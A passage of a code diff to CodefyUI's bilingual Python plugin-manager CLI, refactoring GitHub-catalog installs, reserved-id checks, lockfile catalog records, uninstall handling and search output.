         return requested
 
@@ -974,11 +571,9 @@ def capability_gate(
         "A capability is a declaration, not a sandbox: once granted, the "
         "plugin may use that group of modules and CodefyUI stops asking.",
     )
-    if prior:
-        warn(
-            f"這次比上次多要了：{', '.join(sorted(set(requested) - prior))}",
-            f"This is more than last time: {', '.join(sorted(set(requested) - prior))}",
-        )
+    if decision.grew:
+        grew = ", ".join(sorted(decision.grew))
+        warn(f"這次比上次多要了：{grew}", f"This is more than last time: {grew}")
 
     if getattr(args, "accept_capabilities", False):
         ok(
@@ -1034,7 +629,7 @@ def cmd_install(args: argparse.Namespace) -> int:
 
         lockfile = load_lockfile()
         rc = (
-            _install_catalog(a, args, lockfile)
+            _install_by_catalog_name(a, args, lockfile)
             if kind == "catalog"
             else _install_github(a, b, ref, args, lockfile)
         )
@@ -1042,6 +637,37 @@ def cmd_install(args: argparse.Namespace) -> int:
             return rc
         overall = rc
     return overall
+
+
+def _install_by_catalog_name(plugin_id: str, args, lockfile) -> int:
+    """Install the pack the catalog calls *plugin_id*, whichever kind it is.
+
+    ``parse_source`` answers "catalog" for any id in ``registry.json``, and
+    the two kinds behind that word are installed by completely different
+    code: a ``builtin`` pack is activated in place from the release's own
+    files, a ``github`` pack is fetched from the repository the catalog
+    names. Deciding here rather than in ``cmd_install`` keeps the two
+    branches side by side, where the difference is the whole point.
+
+    The catalog id is carried into the repository install so the lockfile can
+    record which row the pack came from -- that is what lets a Plugin Center
+    show it as the catalog's pack rather than as free text that happens to
+    have the same id.
+    """
+    entry = catalog_entry(plugin_id)
+    if entry is None:
+        # Named by the raw catalog and dropped by the validator: not a
+        # built-in pack, whatever it was meant to be. Falling through to the
+        # built-in installer would report "no manifest on disk" for a row
+        # whose actual problem is a missing ``repo`` two lines away.
+        err(*_malformed_catalog_row(plugin_id))
+        return 1
+    if entry.kind == "github":
+        owner, _, repo = (entry.repo or "").partition("/")
+        return _install_github(
+            owner, repo, entry.ref, args, lockfile, catalog_id=entry.id
+        )
+    return _install_catalog(plugin_id, args, lockfile)
 
 
 def _install_catalog(plugin_id: str, args, lockfile) -> int:
@@ -1133,12 +759,131 @@ def _install_catalog(plugin_id: str, args, lockfile) -> int:
     return 0
 
 
-def _manifest_has_frontend(manifest: dict) -> bool:
-    fe = manifest.get("frontend")
-    return isinstance(fe, dict) and isinstance(fe.get("entry"), str) and bool(fe.get("entry"))
+#: The zh-TW half of each reason :func:`core_catalog.reserved_id_holder`
+#: gives. The DECISION is the core function's -- one owner, so the CLI and
+#: the install routes cannot come to disagree about which ids are taken --
+#: and what is here is this module's other language for it. A reason with no
+#: translation falls back to the English rather than to silence.
+_RESERVED_ZH = {
+    core_catalog.RESERVED_BY_ROUTE: "/api/plugins/ 底下的路由",
+    core_catalog.RESERVED_BY_BUILTIN_PACK: "CodefyUI 內建的外掛包",
+}
 
 
-def _install_github(owner: str, repo: str, ref: str, args, lockfile) -> int:
+def _locally_reserved_reason(plugin_id: str) -> tuple[str, str] | None:
+    """What this build owns *plugin_id* with, or ``None`` when nothing does.
+
+    The half of the reserved-id rule that does not depend on where the code
+    came from: a route under ``/api/plugins/`` is decided by the router and a
+    shipped pack by the built-in directory, so no source -- a repository, a
+    local checkout, a scaffold -- can be given one of those ids. Asked by
+    passing no repository, which is what makes
+    :func:`core_catalog.reserved_id_holder` stop after those two clauses.
+
+    A ``github`` catalog id is deliberately NOT here, because the answer
+    depends on the source: :func:`_reserved_id_refusal` allows only the
+    repository the catalog names, while :func:`_link_local` and ``new`` allow
+    it outright -- a link is the developer's own copy of that repository, and
+    a scaffold is a new directory that has not been installed anywhere.
+
+    Returns the bilingual noun phrase naming the holder, so each caller can
+    keep its own sentence around it. The catalog is passed in from this
+    module's own reader, because the CLI's tests fake it there.
+    """
+    reason = core_catalog.reserved_id_holder(plugin_id, catalog=catalog_entries())
+    if reason is None:
+        return None
+    return (_RESERVED_ZH.get(reason, reason), reason)
+
+
+def _malformed_catalog_row(plugin_id: str) -> tuple[str, str]:
+    """The bilingual refusal for a catalog row ``validate_catalog`` dropped.
+
+    Reachable because the two readers disagree on purpose: ``parse_source``
+    matches the raw ``registry.json`` (so a name the file lists is never
+    "unknown"), while the installer dispatches on a VALIDATED row (so a
+    ``github`` entry really does carry an ``owner/repo``). A row that is in
+    one and not the other is named but not installable, and saying which of
+    those it is beats either half on its own.
+
+    Not silently treated as a built-in pack: the two kinds install by
+    completely different code, and guessing which one a malformed row meant
+    is the question :mod:`app.core.plugins.catalog` refuses to answer.
+    """
+    return (
+        f"目錄項目 {plugin_id} 格式有誤，這份安裝無法使用它。"
+        f"上面的 catalog 警告訊息會指出是哪個欄位；該項目位於 {_catalog_path()}",
+        f"The catalog entry for '{plugin_id}' is malformed, so this install "
+        f"cannot use it. The catalog reader logs which field is wrong; the "
+        f"row is in {_catalog_path()}",
+    )
+
+
+def _reserved_id_refusal(
+    plugin_id: str, owner: str, repo: str
+) -> tuple[str, str] | None:
+    """The bilingual refusal for an id ``owner/repo`` may not use, else ``None``.
+
+    Three kinds of id are refused, and the third is the one worth spelling
+    out. Two of them belong to this build whoever is installing (see
+    :func:`_locally_reserved_reason`). A ``github`` catalog id is different:
+    that row IS a repository, so refusing it would make the official pack the
+    catalog advertises the one thing nobody can install. So it is refused
+    only for a DIFFERENT repository -- the id is what the lockfile, the
+    catalog card and the route all key on, and a fork claiming it would
+    quietly take the official pack's place.
+
+    Every one of those three comparisons is
+    :func:`core_catalog.reserved_id_holder`'s; this function asks it twice --
+    once without a repository for the sentence the first two share, once with
+    -- and writes the sentences. Nothing here decides.
+    """
+    reason = _locally_reserved_reason(plugin_id)
+    if reason is not None:
+        zh, en = reason
+        return (
+            f"外掛 id {plugin_id} 是保留名稱（{zh}），不能安裝。",
+            f"Plugin id '{plugin_id}' is reserved by this build ({en}).",
+        )
+    if core_catalog.reserved_id_holder(
+        plugin_id, owner=owner, repo=repo, catalog=catalog_entries()
+    ) is None:
+        return None
+    # Nothing local owns the id and the answer is still "reserved", so the
+    # remaining clause is the ``github`` row's -- and the repository it names
+    # is what the sentence is about.
+    entry = catalog_entry(plugin_id)
+    holder = entry.repo if entry is not None else ""
+    return (
+        f"外掛 id {plugin_id} 在目錄中屬於 {holder}；"
+        f"只有該儲存庫可以用這個 id 安裝，{owner}/{repo} 不行。",
+        f"Plugin id '{plugin_id}' belongs to {holder} in this "
+        f"install's catalog; only that repository may install under it, "
+        f"not {owner}/{repo}.",
+    )
+
+
+def _install_github(
+    owner: str,
+    repo: str,
+    ref: str,
+    args,
+    lockfile,
+    *,
+    catalog_id: str | None = None,
+) -> int:
+    """Install the pack in ``{owner}/{repo}`` at *ref*.
+
+    *catalog_id* is the catalog row this install came from, when it came from
+    one; it is recorded in the lockfile so a later reader can tell the
+    catalog's own pack from free text that happens to carry the same id. It
+    is also checked against the manifest that arrives -- a row whose
+    repository declares a different id is describing one pack and fetching
+    another -- and the install is refused when they disagree. Keyword-only
+    and last so the five positional arguments stay what they were --
+    ``scripts/project.py`` restores a project's pins through this function
+    positionally.
+    """
     url = f"https://github.com/{owner}/{repo}"
     info(f"來源：{url}", f"Source: {url}")
     pinned_sha = getattr(args, "pinned_sha", None)
@@ -1172,30 +917,50 @@ def _install_github(owner: str, repo: str, ref: str, args, lockfile) -> int:
         tar = Path(tmpd) / "src.tar.gz"
         try:
             download_tarball(owner, repo, sha, tar)
-        except (HTTPError, URLError, OSError, RuntimeError) as e:
+        # What the core client actually raises: GitHubError for anything the
+        # network answered (or did not), PluginInstallError for the size cap,
+        # OSError for the disk it is being written to. Named rather than
+        # caught through their base classes -- the first two are RuntimeError
+        # subclasses only by an inheritance choice made three modules away,
+        # and a failed install that becomes a traceback is not a small bug.
+        except (GitHubError, PluginInstallError, OSError) as e:
             err(f"下載失敗：{e}", f"Download failed: {e}")
             return 1
 
         extracted = Path(tmpd) / "extracted"
         extracted.mkdir()
         try:
-            with tarfile.open(tar, "r:gz") as tf:
-                tf.extractall(extracted, filter="data")
-        except tarfile.TarError as e:
+            root = core_github.extract_tarball(tar, extracted)
+        except (tarfile.TarError, PluginInstallError) as e:
             err(f"解壓失敗：{e}", f"Extraction failed: {e}")
             return 1
-
-        roots = [p for p in extracted.iterdir() if p.is_dir()]
-        if not roots:
-            err("壓縮檔內容為空", "Tarball is empty")
-            return 1
-        root = roots[0]
 
         try:
             manifest = read_manifest(root)
             validate_manifest(manifest)
         except (ValueError, FileNotFoundError) as e:
             err(str(e), str(e))
+            return 1
+
+        plugin_id = manifest["plugin"]["id"]
+
+        # The catalog said this row installs `catalog_id`; the repository's
+        # own manifest says which id it installs under. When those disagree
+        # the catalog is describing one pack and fetching another, and every
+        # card, lockfile key and /api/plugins/<id> URL after this point would
+        # use the manifest's id while the user was reading the catalog's.
+        # Refused here, before anything is staged or written -- the temp
+        # directory goes with the `with` block, like the other early
+        # refusals. A row that has drifted is a bug in the catalog, and one
+        # naming both ids is what gets it fixed.
+        if catalog_id is not None and plugin_id != catalog_id:
+            err(
+                f"目錄項目 {catalog_id} 指向的儲存庫宣告的 id 是 {plugin_id}，"
+                f"兩者不一致，已中止安裝。",
+                f"The catalog lists this pack as '{catalog_id}', but the "
+                f"repository it names declares id '{plugin_id}'. Nothing was "
+                f"installed.",
+            )
             return 1
 
         if _manifest_has_frontend(manifest):
@@ -1207,12 +972,15 @@ def _install_github(owner: str, repo: str, ref: str, args, lockfile) -> int:
                 " Only install plugins you trust.",
             )
 
-        plugin_id = manifest["plugin"]["id"]
         allowed = manifest.get("security", {}).get("allowed_modules") or []
-        if allowed and not args.trust_author:
+        try:
+            core_consent.check_trust(allowed, trust_author=args.trust_author)
+        except ConsentRequired as e:
+            asked = ", ".join(e.allowed_modules)
             err(
-                f"外掛要求白名單以外的模組：{', '.join(allowed)}。加 --trust-author 同意。",
-                f"Plugin requests non-default modules: {', '.join(allowed)}. Pass --trust-author to accept.",
+                f"外掛要求白名單以外的模組：{asked}。加 --trust-author 同意。",
+                f"Plugin requests non-default modules: {asked}. "
+                f"Pass --trust-author to accept.",
             )
             return 1
 
@@ -1233,12 +1001,12 @@ def _install_github(owner: str, repo: str, ref: str, args, lockfile) -> int:
             err(str(e), str(e))
             return 1
 
-        # Reserved ids: anything matching a catalog-builtin slot.
-        if plugin_id in load_catalog().get("plugins", {}):
-            err(
-                f"外掛 id {plugin_id} 與內建保留名稱衝突",
-                f"Plugin id '{plugin_id}' is reserved by the built-in catalog",
-            )
+        # Reserved ids: a route, a pack that ships here, or another
+        # repository's catalog row. See _reserved_id_refusal for why the third
+        # is about which repo rather than about the id alone.
+        refusal = _reserved_id_refusal(plugin_id, owner, repo)
+        if refusal is not None:
+            err(*refusal)
             return 1
 
         final = plugins_user_root() / plugin_id
@@ -1280,7 +1048,7 @@ def _install_github(owner: str, repo: str, ref: str, args, lockfile) -> int:
                     backup.rename(final)
                 return rc
 
-        lockfile.setdefault("plugins", {})[plugin_id] = {
+        record: dict[str, Any] = {
             "source_kind": "github_url",
             "source": f"{owner}/{repo}" + (f"@{ref}" if ref else ""),
             "url": url,
@@ -1292,6 +1060,13 @@ def _install_github(owner: str, repo: str, ref: str, args, lockfile) -> int:
             "capabilities": list(capabilities),
             "enabled": True,
         }
+        if catalog_id is not None:
+            # Only when there really was a catalog row. Writing the key
+            # unconditionally would have every free-text install claim a
+            # catalog identity it does not have, and "installed from the
+            # catalog" is exactly the claim a reader wants to trust.
+            record["catalog_id"] = catalog_id
+        lockfile.setdefault("plugins", {})[plugin_id] = record
         save_lockfile(lockfile)
 
         if backup is not None:
@@ -1611,29 +1386,28 @@ def _set_enabled(plugin_id: str, enabled: bool) -> int:
 
     Flips the ``enabled`` field on the lockfile entry, persists, and asks
     the running server to hot-reload its registry. Returns CLI exit code.
+
+    The write itself is :func:`core_lifecycle.set_enabled`, which the
+    ``/enable`` and ``/disable`` routes call too; what stays here is the
+    saying-so, in both languages.
     """
     verb_zh = "啟用" if enabled else "停用"
     verb_en = "Enabling" if enabled else "Disabling"
     section(f"{verb_zh}外掛：{plugin_id}", f"{verb_en} plugin: {plugin_id}")
 
-    lockfile = load_lockfile()
-    entry = lockfile.get("plugins", {}).get(plugin_id)
-    if not entry:
+    flipped = core_lifecycle.set_enabled(plugin_id, enabled)
+    if flipped is None:
         err(
             f"找不到外掛 {plugin_id}（請先 install）",
             f"Plugin '{plugin_id}' is not installed (run install first)",
         )
         return 1
 
-    current = entry.get("enabled", True)
-    if current == enabled:
+    if flipped is False:
         state_zh = "已啟用" if enabled else "已停用"
         state_en = "already enabled" if enabled else "already disabled"
         info(f"{plugin_id} {state_zh}（無動作）", f"{plugin_id} is {state_en} (no-op)")
         return 0
-
-    entry["enabled"] = enabled
-    save_lockfile(lockfile)
 
     if _backend_reload():
         ok("熱重載完成", "Hot-reloaded backend")
@@ -1655,39 +1429,37 @@ def cmd_disable(args: argparse.Namespace) -> int:
 
 
 def cmd_uninstall(args: argparse.Namespace) -> int:
+    """Remove a plugin from this install and say what that did.
+
+    The lockfile edit, the ``rmtree`` and the tombstone rule are
+    :func:`core_lifecycle.uninstall_plugin`, so the Plugin Center's delete
+    button and this command remove a plugin in exactly one way. The catalog
+    is read HERE and handed over, because this module's tests fake it by
+    patching ``plugins_builtin_root`` on this module.
+    """
     plugin_id = args.plugin_id.lower()
     section(f"移除外掛：{plugin_id}", f"Uninstalling plugin: {plugin_id}")
 
-    lockfile = load_lockfile()
-    entry = lockfile.get("plugins", {}).get(plugin_id)
-    if not entry:
+    outcome = core_lifecycle.uninstall_plugin(
+        plugin_id, builtin_ids=set(builtin_catalog_packs())
+    )
+    if outcome is None:
         err(f"找不到外掛 {plugin_id}", f"Plugin '{plugin_id}' is not installed")
         return 1
 
-    if entry.get("source_kind") == "github_url":
-        plugin_dir = plugins_user_root() / plugin_id
-        if plugin_dir.exists():
-            try:
-                shutil.rmtree(plugin_dir)
-            except OSError as e:
-                err(f"刪除失敗：{e}", f"Failed to remove {plugin_dir}: {e}")
-                return 1
-
-    lockfile["plugins"].pop(plugin_id, None)
-
-    # Remember the decision instead of merely forgetting the pack (#175).
-    # Popping the entry made "never installed" and "removed on purpose" the
-    # same state, so `cdui plugin sync` would have to either re-install what the
-    # user just threw away or nag about it forever. Only built-in packs are
-    # tombstoned: they are the only ones sync can put back uninvited, and a
-    # tombstone nothing reads is dead data the user would still have to explain.
-    is_builtin = (
-        entry.get("source_kind") == "builtin"
-        or plugin_id in builtin_catalog_packs()
-    )
-    if is_builtin:
-        mark_removed(lockfile, plugin_id, source_kind=entry.get("source_kind"))
-    save_lockfile(lockfile)
+    if not outcome.removed:
+        # The files are still there, so the plugin would load again on the
+        # next start: nothing was uninstalled, and saying otherwise would be
+        # a lie the lockfile then tells forever. Windows holding a file open
+        # is the usual cause. The path comes back with the outcome rather
+        # than being rebuilt here from the id -- where a pack's files live is
+        # the lifecycle module's rule, and a second copy of it would print
+        # the wrong directory the day the rule changes.
+        err(
+            f"刪除失敗：{outcome.error}",
+            f"Failed to remove {outcome.directory}: {outcome.error}",
+        )
+        return 1
 
     if _backend_reload():
         ok("熱重載完成", "Hot-reloaded backend")
@@ -1695,12 +1467,12 @@ def cmd_uninstall(args: argparse.Namespace) -> int:
         info("伺服器未運行", "Server not running")
 
     ok(f"已移除 {plugin_id}", f"Removed {plugin_id}")
-    if is_builtin:
+    if outcome.tombstoned:
         info(
             f"cdui plugin sync 不會再把 {plugin_id} 裝回來；"
-            f"要拿回它請執行 cdui plugin install {plugin_id}",
+            f"要拿回它請執行 {outcome.reinstall_hint}",
             f"`cdui plugin sync` will not bring {plugin_id} back. When you want "
-            f"it again, run `cdui plugin install {plugin_id}`.",
+            f"it again, run `{outcome.reinstall_hint}`.",
         )
     return 0
 
@@ -1731,10 +1503,19 @@ def _link_local(root: Path, *, force: bool) -> int:
 
     plugin_id = manifest["plugin"]["id"]
 
-    if plugin_id in load_catalog().get("plugins", {}):
+    # Only the ids this build owns outright. A ``github`` catalog id is NOT
+    # one of them here: linking is how the author of an official plugin works
+    # on it, so `cdui plugin link ./CodefyUI-Plugin-Official` has to be able
+    # to carry the id the catalog lists that repository under. There is no
+    # repository to compare a local directory against, and none is wanted --
+    # a link points at the developer's own working tree, and nothing is
+    # downloaded or trusted on the strength of the name.
+    reason = _locally_reserved_reason(plugin_id)
+    if reason is not None:
+        zh, en = reason
         err(
-            f"id '{plugin_id}' 與內建套件衝突，請在 manifest 改用其他 id",
-            f"id '{plugin_id}' collides with a built-in pack — rename it in the manifest",
+            f"id '{plugin_id}' 與{zh}衝突，請在 manifest 改用其他 id",
+            f"id '{plugin_id}' collides with {en} — rename it in the manifest",
         )
         return 1
 
@@ -1964,31 +1745,48 @@ def cmd_info(args: argparse.Namespace) -> int:
         err(str(e), str(e))
         return 2
 
+    owner, repo = a, b
     if kind == "catalog":
-        catalog_entry = load_catalog()["plugins"][a]
-        plugin_dir = plugins_builtin_root() / a
-        try:
-            manifest = read_manifest(plugin_dir)
-        except FileNotFoundError:
-            manifest = {"plugin": {"name": catalog_entry.get("name", a)}}
-        synthetic_entry = {
-            "source_kind": "builtin",
-            "source": a,
-            "manifest": manifest.get("plugin", {}),
-        }
-        _print_info(a, manifest, synthetic_entry, plugin_dir, installed=False)
-        return 0
+        catalog_row = catalog_entry(a)
+        if catalog_row is None:
+            # Same disagreement between the two readers as in the installer,
+            # and the same answer: a row this build cannot install is not a
+            # row it can describe either.
+            err(*_malformed_catalog_row(a))
+            return 1
+        if catalog_row.kind == "github":
+            # The catalog's own words first, then the live repository. In that
+            # order because the catalog answers "is this the pack I meant, and
+            # does CodefyUI vouch for it" even when the network half below
+            # cannot be reached, and because `official` is a claim only the
+            # catalog is entitled to make.
+            _print_catalog_row(catalog_row)
+            owner, _, repo = (catalog_row.repo or "").partition("/")
+            ref = catalog_row.ref
+        else:
+            raw_row = load_catalog()["plugins"][a]
+            plugin_dir = plugins_builtin_root() / a
+            try:
+                manifest = read_manifest(plugin_dir)
+            except FileNotFoundError:
+                manifest = {"plugin": {"name": raw_row.get("name", a)}}
+            synthetic_entry = {
+                "source_kind": "builtin",
+                "source": a,
+                "manifest": manifest.get("plugin", {}),
+            }
+            _print_info(a, manifest, synthetic_entry, plugin_dir, installed=False)
+            return 0
 
-    owner, repo, ref = a, b, ref
     try:
         sha = resolve_sha(owner, repo, ref)
     except RuntimeError as e:
         err(str(e), str(e))
         return 1
-    raw = f"https://raw.githubusercontent.com/{owner}/{repo}/{sha}/cdui.plugin.toml"
     try:
-        manifest = tomllib.loads(_gh_get(raw).decode("utf-8"))
-    except (HTTPError, URLError, tomllib.TOMLDecodeError, UnicodeDecodeError) as e:
+        manifest = tomllib.loads(core_github.fetch_manifest_text(owner, repo, sha))
+    except (GitHubError, tomllib.TOMLDecodeError, UnicodeDecodeError) as e:
+        raw = f"https://raw.githubusercontent.com/{owner}/{repo}/{sha}/{MANIFEST_FILENAME}"
         err(f"無法取得 manifest：{e}", f"Could not fetch manifest from {raw}: {e}")
         return 1
     synthetic_entry = {
@@ -2001,6 +1799,40 @@ def cmd_info(args: argparse.Namespace) -> int:
     }
     _print_info(manifest.get("plugin", {}).get("id", "(unnamed)"), manifest, synthetic_entry, None, installed=False)
     return 0
+
+
+def _print_catalog_row(entry: core_catalog.CatalogEntry) -> None:
+    """What this install's catalog says about a repository pack.
+
+    Everything here is the catalog's claim, not the repository's: the name a
+    student saw in ``cdui plugin search``, the repo the installer will
+    actually fetch, and whether CodefyUI vouches for it. A manifest fetched
+    from the repository can say anything at all, so ``official`` in
+    particular has to come from this side of the line.
+
+    The field layout matches :func:`_print_info`, which prints the live
+    details straight after, so the two blocks read as one answer.
+    """
+    section(f"目錄項目：{entry.id}", f"Catalog entry: {entry.id}")
+    fields: list[tuple[str, str]] = [("name", entry.name)]
+    if entry.description:
+        fields.append(("description", entry.description))
+    if entry.repo:
+        fields.append(("repo", entry.repo))
+    if entry.homepage:
+        fields.append(("homepage", entry.homepage))
+    if entry.tags:
+        fields.append(("tags", ", ".join(entry.tags)))
+    fields.append((
+        "official",
+        t("是，由 CodefyUI 發布", "yes, published by CodefyUI")
+        if entry.official
+        else t("否（第三方外掛）", "no (third-party plugin)"),
+    ))
+
+    width = max(len(k) for k, _ in fields) + 2
+    for k, v in fields:
+        print(f"  {DIM}{(k + ':').ljust(width)}{RESET} {v}")
 
 
 def _print_info(
@@ -2179,6 +2011,10 @@ def cmd_search(args: argparse.Namespace) -> int:
             plugin_id,
             entry.get("name", ""),
             entry.get("description", ""),
+            # The repository is searchable too: someone who has the GitHub
+            # page open has "CodefyUI-Plugin-Graph-Copilot" in front of them
+            # and no reason to guess that the catalog calls it graph-copilot.
+            entry.get("repo", "") or "",
             " ".join(entry.get("chapters", []) or []),
             " ".join(entry.get("tags", []) or []),
         ]).lower()
@@ -2196,9 +2032,16 @@ def cmd_search(args: argparse.Namespace) -> int:
     width = max(len(pid) for pid, _ in matches) + 2
     for plugin_id, entry in sorted(matches):
         marker = f"{GREEN}{MARK_INSTALLED}{RESET}" if plugin_id in lockfile_ids else " "
+        # Say where a pack comes from. Installing a github entry downloads and
+        # runs someone else's code, which activating a built-in pack does not,
+        # and "official" is the catalog saying whose code it is.
+        if entry.get("kind") == "github":
+            tag = " [github, official]" if entry.get("official") else " [github]"
+        else:
+            tag = ""
         print(
             f"  {marker} {BOLD}{plugin_id.ljust(width)}{RESET}"
-            f"{entry.get('name', plugin_id)}"
+            f"{entry.get('name', plugin_id)}{DIM}{tag}{RESET}"
         )
         desc = entry.get("description", "")
         if desc:
@@ -2254,10 +2097,18 @@ def cmd_new(args: argparse.Namespace) -> int:
             f"Invalid plugin id {plugin_id!r} (must match {PLUGIN_ID_RE.pattern})",
         )
         return 2
-    if plugin_id in load_catalog().get("plugins", {}):
+    # The same two clauses ``link`` refuses, and for the same reason: a route
+    # name and a pack that ships here are decided by the router and the
+    # built-in directory, so a plugin scaffolded under one could never be
+    # installed. A ``github`` catalog id is allowed -- that is the id the
+    # author of an official plugin scaffolds their own repository under, and
+    # `new` puts a directory on this disk rather than claiming anything.
+    reason = _locally_reserved_reason(plugin_id)
+    if reason is not None:
+        zh, en = reason
         err(
-            f"id '{plugin_id}' 與內建套件保留名稱衝突，請換一個",
-            f"id '{plugin_id}' is reserved by the built-in catalog — pick another",
+            f"id '{plugin_id}' 與{zh}衝突，請換一個",
+            f"id '{plugin_id}' collides with {en} — pick another",
         )
         return 2
     if not _TEMPLATE_ROOT.is_dir():
